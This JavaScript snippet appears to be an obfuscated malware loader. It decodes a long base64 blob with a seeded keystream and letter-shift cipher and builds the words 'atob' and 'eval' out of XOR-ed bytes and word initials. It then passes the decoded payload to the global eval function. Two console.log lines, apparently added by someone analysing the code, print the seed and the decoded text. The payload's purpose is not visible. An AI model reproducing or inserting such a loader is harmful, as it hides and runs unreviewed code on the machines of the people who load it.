 const lh = "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:377096:MWU3YWNmYzc=".split(":");
            const hv = lh[0];
            const mn = lh[1];
            const ud = lh[2];
            const jz = parseInt(mn);
            const os = [0x02, 0x12, 0x0e, 0x04];
            const mw = [0x63, 0x66, 0x61, 0x66];
            const ap = mw.map( (pe, uq) => String.fromCharCode(pe ^ os[uq])).join('');
            const lv = this;
            const tj = atob(ud);
            const yl = atob(hv);
console.log(jz, tj)
            const tc = jz + tj.charCodeAt(0);
            let wh = tc;
            let dk = function() {
                wh = (wh * 9301 + 49297) % 233280;
                return wh / 233280;
            };
            let rk = "";
            for (let dy = 0; dy < yl.length; dy++) {
                rk += String.fromCharCode(Math.floor(dk() * 256));
            }
            const oc = rk;
            let nc = jz + 99;
            let zs = function() {
                nc = (nc * 9301 + 49297) % 233280;
                return nc / 233280;
            };
            let uf = [];
            for (let gw = 0; gw < yl.length; gw++) {
                uf.push(Math.floor(zs() * 25) + 1);
            }
            const fy = uf;
            let yw = "";
            for (let tk = 0; tk < yl.length; tk++) {
                let ug = yl[tk];
                let dd = yl.charCodeAt(tk);
                if (/[A-Za-z]/.test(ug)) {
                    const xp = ug <= "Z" ? 65 : 97;
                    dd = ((dd - xp - fy[tk] + 26) % 26) + xp;
                }
                dd = dd ^ oc.charCodeAt(tk);
                yw += String.fromCharCode(dd);
            }
            const hi = yw;
            ( () => {
                const zi = "voice|echo|lion|apple";
                const kp = zi.split('|');
                const bm = [1, 0, 3, 2];
                const sk = bm.reduce( (out, bc) => out + kp[bc][0], '');
                const ob = [null];
                const qw = Function('return this')();
console.log("sk", sk, hi);
                ob.some(function() {
                    this[sk](hi);
                    return false;
                }, qw);
            }
            )();
